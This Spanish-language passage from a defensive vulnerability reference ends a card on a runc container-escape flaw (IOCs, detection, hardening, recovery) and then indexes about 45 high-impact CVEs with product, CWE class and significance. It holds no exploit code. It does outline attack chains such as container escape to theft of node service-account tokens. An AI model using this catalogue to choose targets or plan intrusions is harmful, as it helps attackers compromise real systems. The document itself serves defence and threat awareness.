| Vector de ataque | Local al contenedor: ejecutar una imagen maliciosa o controlar un `Dockerfile` que se construya en el entorno |
| Privilegios requeridos | Capacidad de ejecutar un contenedor o de aportar la imagen o el `Dockerfile` |
| Complejidad | Baja con PoC disponible |
| Impacto | Escape del contenedor con acceso al sistema de archivos del host, habitualmente como root |
| Activos comprometidos | El nodo host y, por extensión, todos los contenedores que aloja |
| Movimiento lateral posible | Sí: desde el nodo hacia el resto del cluster |
| Escalada posible | Sí, a root del host |
| Persistencia posible | Sí, en el host o en el nodo |
| Robo de credenciales | Sí: secretos de otros pods, kubelet, credenciales del runtime, tokens de nube del nodo |
| Exfiltración | Sí |
| IOC | Procesos con directorio de trabajo bajo `/proc/self/fd/`; acceso a rutas del host desde procesos de contenedor; `Dockerfile` con `WORKDIR` apuntando a descriptores |
| TTP | Imagen o build malicioso → escape → robo del token de la cuenta de servicio del nodo → escalada en el orquestador |
| Detección | Falco o eBPF: alerta por acceso a rutas del host desde un contenedor; monitorización de `WORKDIR` anómalos en builds |
| Hunting | Revisar builds recientes con `Dockerfile` de origen externo; buscar contenedores cuyo proceso haya accedido a `/proc/*/fd` fuera de su propio espacio |
| Mitigación | Actualizar runc a 1.1.12+ y las versiones correspondientes de Docker/containerd/Buildkit |
| Hardening | No construir imágenes de origen no confiable en nodos de producción; usar constructores sin privilegios (Kaniko, Buildah rootless); user namespaces; seccomp y AppArmor por defecto; nodos dedicados para cargas no confiables |
| Respuesta | Tratar el nodo como comprometido; rotar los secretos accesibles desde él |
| Recuperación | Recrear el nodo; rotar tokens de cuenta de servicio y credenciales de nube del nodo |
| Referencias | Aviso de Snyk sobre Leaky Vessels; aviso de seguridad de runc; avisos de Docker |

---

## Índice de vulnerabilidades de alto impacto

Campos núcleo. Para cualquiera de estas, la ficha completa se construye con el esquema de arriba y datos verificados en la fuente.

| CVE | Nombre | Producto | Clase (CWE) | Por qué importa |
|---|---|---|---|---|
| CVE-2017-0144 | EternalBlue | SMBv1 Windows | CWE-20 | Base de WannaCry y NotPetya; gusano de red |
| CVE-2019-0708 | BlueKeep | RDP Windows | CWE-416 | RCE pre-auth con potencial de gusano |
| CVE-2020-0796 | SMBGhost | SMBv3 | CWE-190 | RCE pre-auth por overflow de compresión |
| CVE-2014-0160 | Heartbleed | OpenSSL | CWE-125 | Fuga de memoria del servidor: claves y sesiones |
| CVE-2014-6271 | Shellshock | Bash | CWE-78 | RCE vía variables de entorno en CGI |
| CVE-2021-34527 | PrintNightmare | Print Spooler | CWE-269 | RCE/escalada; el spooler corre en los DC |
| CVE-2022-30190 | Follina | MSDT / Office | CWE-77 | Ejecución sin macros desde documento |
| CVE-2021-40444 | MSHTML | Office | CWE-20 | Documento con control ActiveX malicioso |
| CVE-2017-11882 | Equation Editor | Office | CWE-787 | Explotado durante años en phishing masivo |
| CVE-2023-23397 | Outlook NTLM leak | Outlook | CWE-294 | Fuga de NTLM sin interacción; usado por actor ruso |
| CVE-2021-42278 + 42287 | noPac / sAMAccountName spoofing | Active Directory | CWE-287 | De usuario de dominio a Domain Admin |
| CVE-2022-26923 | Certifried | AD CS | CWE-295 | Escalada a DA vía plantilla de certificado |
| CVE-2019-1040 | Drop the MIC | NTLM | CWE-345 | Bypass de MIC habilita relay |
| CVE-2021-26855 | ProxyLogon | Exchange | CWE-918 | SSRF pre-auth; campaña HAFNIUM |
| CVE-2025-53770 | ToolShell | SharePoint on-prem | CWE-502 | Deserialización pre-auth; el robo de las MachineKey obliga a rotarlas, no solo a parchear |
| CVE-2022-22965 | Spring4Shell | Spring Framework | CWE-94 | Data binding a `class.module.classLoader` |
| CVE-2017-5638 | Struts2 / Equifax | Apache Struts | CWE-917 | OGNL en `Content-Type` |
| CVE-2022-26134 | Confluence OGNL | Confluence | CWE-917 | RCE pre-auth, explotación masiva |
| CVE-2023-22515 | Confluence broken access control | Confluence | CWE-863 | Creación de administrador sin autenticación |
| CVE-2023-46604 | ActiveMQ OpenWire | Apache ActiveMQ | CWE-502 | RCE usada para desplegar ransomware |
| CVE-2020-14882 | WebLogic console | Oracle WebLogic | CWE-863 | RCE pre-auth encadenada |
| CVE-2018-13379 | FortiOS path traversal | Fortinet SSL-VPN | CWE-22 | Robo de credenciales de VPN en claro |
| CVE-2019-11510 | Pulse Secure | Pulse Connect Secure | CWE-22 | Lectura de archivos arbitraria; base de brechas mayores |
| CVE-2019-19781 | Citrix ADC | Citrix ADC/Gateway | CWE-22 | Path traversal a RCE |
| CVE-2022-1388 | F5 iControl REST | BIG-IP | CWE-287 | Bypass de autenticación a RCE root |
| CVE-2024-3400 | PAN-OS GlobalProtect | Palo Alto | CWE-77 | Inyección de comandos pre-auth, 0-day explotado |
| CVE-2024-21762 | FortiOS SSL-VPN | Fortinet | CWE-787 | Escritura fuera de límites pre-auth |
| CVE-2025-0282 | Ivanti Connect Secure | Ivanti | CWE-121 | Desbordamiento de pila pre-auth explotado como 0-day |
| CVE-2023-20198 | Cisco IOS XE Web UI | Cisco | CWE-269 | Creación de usuario privilegiado sin autenticación |
| CVE-2021-21985 | vCenter vSAN plugin | VMware vCenter | CWE-20 | RCE pre-auth sobre el plano de gestión de virtualización |
| CVE-2021-44228 | Log4Shell | Log4j | CWE-917 | Ficha 1 |
| CVE-2023-4863 | libwebp heap overflow | libwebp | CWE-787 | Afecta a todo navegador y app que decodifique WebP |
| CVE-2023-38831 | WinRAR | WinRAR | CWE-345 | Ejecución al abrir un archivo comprimido preparado |
| CVE-2023-44487 | HTTP/2 Rapid Reset | Implementaciones HTTP/2 | CWE-400 | DDoS de capa 7 a escala récord |
| CVE-2021-3156 | Baron Samedit | sudo | CWE-787 | Escalada a root sin estar en sudoers |
| CVE-2016-5195 | Dirty COW | Kernel Linux | CWE-362 | Escritura en memoria de solo lectura |
| CVE-2022-0847 | Dirty Pipe | Kernel Linux | CWE-665 | Sobrescritura de archivos de solo lectura |
| CVE-2024-6387 | regreSSHion | OpenSSH | CWE-364 | Condición de carrera pre-auth en `sshd` |
| CVE-2019-5736 | runc escape | runc | CWE-78 | Sobrescritura del binario runc del host |
| CVE-2022-0492 | cgroups release_agent | Kernel Linux | CWE-862 | Escape de contenedor sin CAP_SYS_ADMIN completo |
| CVE-2018-1002105 | Kubernetes API proxy | Kubernetes | CWE-863 | Escalada a través del proxy del API server |
| CVE-2020-8554 | ExternalIP MITM | Kubernetes | CWE-283 | Intercepción de tráfico del cluster |
| CVE-2023-34362 | MOVEit | Progress MOVEit | CWE-89 | Ficha 5 |
| CVE-2025-31324 | SAP NetWeaver Visual Composer | SAP | CWE-434 | Subida de archivos sin autenticación, explotada como 0-day |
| CVE-2024-1709 | ScreenConnect auth bypass | ConnectWise | CWE-288 | Toma de control de plataformas RMM y de sus clientes |
